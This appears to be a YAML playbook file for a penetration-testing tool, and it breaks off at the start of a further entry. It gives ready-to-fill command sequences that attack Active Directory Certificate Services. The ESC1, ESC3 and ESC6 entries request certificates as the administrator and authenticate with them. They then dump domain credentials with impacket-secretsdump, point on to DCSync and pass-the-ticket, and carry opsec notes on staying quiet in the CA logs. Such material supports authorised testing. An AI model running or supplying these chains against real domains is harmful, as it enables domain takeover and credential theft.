  - id: adcs_full_audit
    name: ADCS — Full Vulnerability Audit
    tab: ADCS
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [adcs, enum, certipy, vulnerabilities]
    description: Comprehensive ADCS audit covering all known ESC misconfigurations and CA settings.
    commands:
      - label: Certipy full find (files + stdout)
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout -output /tmp/certipy"
      - label: Certify (Windows — from domain-joined host)
        cmd: "Certify.exe find /vulnerable"
      - label: Check CA configuration flags
        cmd: "certipy ca -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -dc-ip {DC_IP}"
      - label: List all templates
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -output /tmp/certipy_all"
      - label: BloodHound ADCS data
        cmd: "bloodhound-python -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -ns {DC_IP} -c Certificate --zip"
    next_steps:
      - "Exploit ESC1 if template allows SAN"
      - "Exploit ESC4 if you have write access to a template"
      - "Exploit ESC8 if web enrollment is on HTTP"
    opsec: "Certipy find is LDAP-based — relatively quiet. CA queries may be logged in the CA audit log."

  - id: adcs_esc1_full
    name: ADCS ESC1 — Full Exploitation
    tab: ADCS
    requires: [DC_IP, CA_IP, CA_NAME, DOMAIN, USERNAME, PASSWORD, TEMPLATE, TARGET_USER]
    tags: [adcs, esc1, san, cert, privesc, domain-admin]
    description: Exploit ESC1 — template allows enrollee to specify arbitrary SAN — to obtain a certificate as any user including Domain Admin.
    commands:
      - label: Confirm template is vulnerable
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout | grep -A 10 '{TEMPLATE}'"
      - label: Request certificate as target user
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template {TEMPLATE} -upn {TARGET_USER}@{DOMAIN}"
      - label: Request certificate as administrator
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_IP}\\{CA_NAME}' -template {TEMPLATE} -upn administrator@{DOMAIN}"
      - label: Authenticate with certificate
        cmd: "certipy auth -pfx administrator.pfx -dc-ip {DC_IP}"
      - label: Use obtained TGT
        cmd: "export KRB5CCNAME=./administrator.ccache && impacket-secretsdump -k -no-pass {DOMAIN}/administrator@{DC_IP}"
    next_steps:
      - "Use recovered NTLM hash for DCSync"
      - "Use TGT for pass-the-ticket attacks"
    opsec: "Certificate enrollment generates CA event 4886. Single enrollment request blends into normal traffic."
    cleanup:
      - label: Delete certificate files
        cmd: "rm -f administrator.pfx administrator.ccache"

  - id: adcs_esc3
    name: ADCS ESC3 — Certificate Request Agent Abuse
    tab: ADCS
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, CA_NAME, CA_IP]
    requires_priv: null
    tags: [adcs, esc3, cert, enrollment-agent, privesc]
    description: >
      ESC3: A template allows Certificate Request Agent enrollment, and a
      second template allows enrolment on behalf of another user.
      Combine both to obtain a certificate authenticating as any user.
    commands:
      - label: Find ESC3 vulnerable templates
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout"
      - label: Step 1 — Request enrollment agent cert
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template EnrollmentAgent"
      - label: Step 2 — Request cert on behalf of DA
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template User -on-behalf-of '{DOMAIN}\\administrator' -pfx agent.pfx"
      - label: Authenticate with obtained cert
        cmd: "certipy auth -pfx administrator.pfx -dc-ip {DC_IP}"
    next_steps:
      - "Use recovered NTLM hash for DCSync"
      - "Obtain TGT for pass-the-ticket"
    opsec: "Certificate requests are logged in the CA event log (event 4886). Two-step request may raise alerts."
    cleanup:
      - label: Revoke issued certificates (CA admin only)
        cmd: "certutil -revoke <serial> -config '{CA_IP}\\{CA_NAME}'"

  - id: adcs_esc6
    name: ADCS ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
    tab: ADCS
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, CA_NAME, CA_IP]
    requires_priv: null
    tags: [adcs, esc6, cert, san, ca-flag]
    description: >
      ESC6: The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, allowing
      any template (even those with SAN disabled) to accept a user-specified
      SAN. Effectively makes every template ESC1-vulnerable.
    commands:
      - label: Check CA flags
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -stdout | grep -A5 'EditFlags'"
      - label: Confirm with certutil on target
        cmd: "nxc smb {CA_IP} -u {USERNAME} -p '{PASSWORD}' -x 'certutil -config \"{CA_IP}\\{CA_NAME}\" -getreg policy\\EditFlags'"
      - label: Request cert with SAN override (any template)
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template User -upn administrator@{DOMAIN}"
      - label: Authenticate with cert
        cmd: "certipy auth -pfx administrator.pfx -dc-ip {DC_IP}"
    next_steps:
      - "ESC6 affects ALL templates — escalation is trivial"
      - "Recommend CA flag remediation as critical finding"
    opsec: "Request logs identical to ESC1. Single cert request — low noise."

  - id: adcs_enum
    name: ADCS Enumeration — Find Vulnerable Templates
